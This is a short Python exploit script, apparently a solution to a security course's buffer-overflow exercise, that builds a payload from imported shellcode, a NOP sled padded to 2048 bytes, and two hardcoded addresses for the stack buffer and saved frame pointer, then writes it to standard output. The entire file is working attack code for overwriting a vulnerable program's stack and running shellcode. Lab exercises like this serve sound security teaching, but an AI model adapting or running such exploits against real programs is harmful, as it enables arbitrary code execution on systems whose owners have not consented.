import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
nops = b'\x90' * (2048 - len(shellcode))
payload1 = pack("<I", 0xfff6f6d8) # <-- Addr to &buf (aka shellcode)
payload2 = pack("<I", 0xfff6feec) # <-- Addr to $ebp

# Launch the attack!
sys.stdout.buffer.write(shellcode + nops + payload1 + payload2)
